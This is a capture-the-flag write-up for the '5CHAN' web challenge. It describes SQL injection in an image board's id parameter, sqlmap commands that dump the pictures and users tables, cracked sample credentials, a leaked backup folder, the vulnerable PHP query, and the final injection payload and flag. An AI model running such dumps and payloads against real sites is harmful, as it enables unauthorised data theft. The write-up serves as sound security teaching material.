# 5CHAN

**Category:** Web
**Points:** 15
**Description:**

> 5CHAN? never heard of this image board, but they have exactly what we need,the picture we're looking for is not for public, so can you get it?
> http://188.40.18.89/

## Write-up

5CHAN was a simple image site.

It contained 8 different images on the frontpage. While there was a register link, registration was disabled. There was also a login page and search bar, but both seemed to do nothing.

The goal was to find a private image hidden on the site.

Clicking on an image brought us to its page:
`http://188.40.18.89/?page=pic&id=1`

The id parameter was susceptible to SQL injection:
http://188.40.18.89/?page=pic&id=%27

We started enumerating databases:
```bash
$ sqlmap -u "http://188.40.18.89/?id=1&page=pic" --dbs --threads 10
```

And found a database called `5chan`. We enumerated the tables: 
`pictures` and `users`.

And dumped them:
```bash
$ sqlmap -u "http://188.40.18.89/?id=8&page=pic" -D 5chan -T pictures --dump --threads 10
$ sqlmap -u "http://188.40.18.89/?id=8&page=pic" -D 5chan -T users --dump --threads 10
```

The users table contained several usernames including their password in SHA1. Doing a quick search led us to immediately find following user accounts:
`unfoldedclunk:abcdef` and `boxercheek:123456`.

The pictures table included 9 pictures, the final one being the flag with id 9. Unfortunately, trying the above link with this id did not give us any result.

We proceeded to check for other clues and found a [robots.txt](robots.txt) file in the http root. This file mentioned a special folder: `/.OurBackupz/`. This folder included a backup of the code and database. 

The database did not contain any passwords (unlike our dump) but we now possessed the original source code for the image board.

In `/__pages/__pic.php` we found following line used to return an image:

```php
$request="SELECT * FROM pictures WHERE level<=$access AND id=".mysqli_real_escape_string($con,@$_GET['id']." LIMIT 0,1");
```

While they used mysqli_real_escape_string() to escape any malicious characters, they forgot to put quotes around it, making following injection possible:

```mysql
SELECT * FROM pictures WHERE level<=1 AND id=9 OR id=9 AND 1=1 LIMIT 0,1
```

With this payload:

`http://188.40.18.89/?page=pic&id=9 OR id=9 AND 1=1`

The flag.jpg image was shown, containing the flag:
`31c3_st0Pp_Us1nG_==_&&_St4rt_Us1Ng_===`